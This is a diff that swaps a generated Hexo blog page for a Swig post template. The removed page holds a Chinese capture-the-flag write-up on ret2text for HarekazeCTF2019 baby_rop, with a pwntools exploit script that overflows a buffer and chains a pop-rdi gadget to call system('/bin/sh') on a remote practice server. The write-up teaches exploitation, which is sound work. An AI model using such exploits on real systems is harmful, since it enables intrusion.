@@ -1,217 +1,37 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-    <!DOCTYPE html>
-<html>
+{% extends '_layout.swig' %}
+{% import '_macro/post.swig' as post_template %}
+{% import '_macro/sidebar.swig' as sidebar_template %}
 
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
-  
-  <title>ret2text - 8023</title>
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-    <link rel='manifest' href='/manifest.json'>
-  
 
-  
-<link rel="stylesheet" href="/css/var.css">
+{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-  
-<link rel="stylesheet" href="/css/main.css">
+{% block page_class %}page-post-detail{% endblock %}
 
-  
-<link rel="stylesheet" href="/css/typography.css">
 
-  
-<link rel="stylesheet" href="/css/code-highlighting.css">
+{% block content %}
 
-  
-<link rel="stylesheet" href="/css/components.css">
+  <div id="posts" class="posts-expand">
+    {{ post_template.render(page) }}
 
-  
-<link rel="stylesheet" href="/css/nav.css">
-
-  
-<link rel="stylesheet" href="/css/paginator.css">
-
-  
-<link rel="stylesheet" href="/css/footer.css">
-
-  
-<link rel="stylesheet" href="/css/post-list.css">
-
-  
-<link rel="stylesheet" href="/css/waline.css">
-
-  
-  
-  
-<link rel="stylesheet" href="/css/post.css">
-
-  
-
-  
-<meta name="generator" content="Hexo 5.4.0"></head>
-    <body>
-        <nav id="theme-nav">
-    <div class="inner">
-        <a class="title" href="/">Blog</a>
-        <div class="nav-arrow"></div>
-        <div class="nav-items">
-            <a class="nav-item nav-item-home" href="/">Home</a>
-            
-            
-            <a class="nav-item" href="/archives">Archives</a>
-            
-            
-            
-            <a class="nav-item" href="/friends">Friends</a>
-            
-            
-            
-            <a class="nav-item" href="/projects">Projects</a>
-            
-            
-            
-            <a class="nav-item" href="/about">About</a>
-            
-            
-            
-            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank">&nbsp;</a>
-            
-            
-            
-            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank">&nbsp;</a>
-            
-            
-            
-            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank">&nbsp;</a>
-            
-            
-        </div>
+    <div class="post-spread">
+      {% if theme.jiathis %}
+        {% include '_partials/share/jiathis.swig' %}
+      {% elseif theme.baidushare %}
+        {% include '_partials/share/baidushare.swig' %}
+      {% elseif theme.add_this_id %}
+        {% include '_partials/share/add-this.swig' %}
+      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
+        {% include '_partials/share/duoshuo_share.swig' %}
+      {% endif %}
     </div>
-</nav>
-        <article class="post">
-    <div class="meta">
-        
-        <div class="date" id="date">
-            
-            
-            
-            
-            
-            
-            <span>June</span>
-            
-            
-            
-            
-            
-            
-            
-            <span>20,</span>
-            <span>2021</span>
-        </div>
-        
+  </div>
 
-        <h2 class="title">ret2text</h2>
-    </div>
+{% endblock %}
 
-    <div class="divider"></div>
+{% block sidebar %}
+  {{ sidebar_template.render(true) }}
+{% endblock %}
 
-    <div class="content">
-        <span id="more"></span>
-<h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><p>ret2text 即控制程序执行程序本身已有的的代码 (.text),使EIP指向具有system(“/bin/sh”)的代码段。<br>其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
-<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
-<h2 id="例题：-HarekazeCTF2019-baby-rop-ret2text"><a href="#例题：-HarekazeCTF2019-baby-rop-ret2text" class="headerlink" title="例题： [HarekazeCTF2019]baby_rop(ret2text)"></a>例题： [HarekazeCTF2019]baby_rop(ret2text)</h2><p>先查壳，开了NX，64位</p>
-<p><img src="/img/image-20210620201226614.png" alt="image-20210620201226614"></p>
-<p>IDA打开，F5查看main函数</p>
-<p><img src="/img/image-20210620201505692.png" alt="image-20210620201505692"></p>
-<p><img src="/img/image-20210620201559551.png" alt="image-20210620201559551"></p>
-<p>看见system函数</p>
-<p>然后F12+shift搜索字符串，还找到了’/bin/sh/‘</p>
-<p><img src="/img/image-20210620201708611.png" alt="image-20210620201708611"></p>
-<p><img src="/img/image-20210620202004923.png" alt="image-20210620202004923"></p>
-<p>因为64位传参需要用到寄存器，所以用gadget找到rdi寄存器位置</p>
-<p><img src="/img/image-20210620202405923.png" alt="image-20210620202405923"></p>
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"># <span class="built_in">io</span> = process(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"><span class="built_in">io</span> = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="string">&#x27;28379&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x601048</span></span><br><span class="line">system_addr = e.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400683</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">io</span>.recvuntil(<span class="string">&#x27;your name?&#x27;</span>)</span><br><span class="line">payload = <span class="number">0x18</span> * b<span class="string">&#x27;a&#x27;</span> + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"><span class="built_in">io</span>.sendline(payload)</span><br><span class="line"><span class="built_in">io</span>.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这里夺权之后还有一个小坑，就是flag不在根目录下，需要通过查找获得位置，然后拿到flag</p>
-<p><img src="/img/image-20210620202949778.png" alt="image-20210620202949778"></p>
-<p>这是属于最简单的例题，稍微难一点的会涉及到计算地址偏移量。</p>
-
-    </div>
-
-    <div class="about">
-        <h1>About this Post</h1>
-        <p>This post is written by Pr0b1em, licensed under <a
-                target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
-    </div>
-
-    
-        
-    
-</article>
-        <footer>
-    <div class="inner">
-        <div class="links">
-            
-            <div class="group">
-                <h4 class="title">Blog</h4>
-                
-                <a href="/" class="item" target="_blank">Blog</a>
-                
-                <a href="/archives" class="item" target="_blank">Archives</a>
-                
-                <a href="/friends" class="item" target="_blank">Friends</a>
-                
-                <a href="/projects" class="item" target="_blank">Projects</a>
-                
-                <a href="/resume" class="item" target="_blank">Resume</a>
-                
-                <a href="/about" class="item" target="_blank">About</a>
-                
-                <a href="/atom.xml" class="item" target="_blank">RSS</a>
-                
-            </div>
-            
-            <div class="group">
-                <h4 class="title">Projects</h4>
-                
-                <a href="https://github.com/transmister" class="item" target="_blank">Transmister</a>
-                
-                <a href="https://github.com/MrWillCom/css-and-js-windows-uwp-xaml-controls" class="item" target="_blank">CSS&amp;JS Windows UWP XAML Controls</a>
-                
-                <a href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item" target="_blank">Theme Cupertino</a>
-                
-                <a href="https://github.com/MrWillCom/github-dark-mode" class="item" target="_blank">GitHub Dark Mode</a>
-                
-            </div>
-            
-            <div class="group">
-                <h4 class="title">Me</h4>
-                
-                <a href="https://github.com/MrWillCom" class="item" target="_blank">GitHub</a>
-                
-                <a href="https://codepen.io/mrwillcom" class="item" target="_blank">CodePen</a>
-                
-                <a href="https://www.patreon.com/MrWillCom" class="item" target="_blank">Patreon</a>
-                
-                <a href="mailto:mr.will.com@outlook.com" class="item" target="_blank">Email</a>
-                
-            </div>
-            
-        </div>
-        &copy; 2021 Pr0b1em<br />
-        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
-    </div>
-</footer>
-
-        
-<script src="/js/main.js"></script>
-
-        
-    </body>
-</html>
+{% block script_extra %}
+  {% include '_scripts/pages/post-details.swig' %}
+{% endblock %}
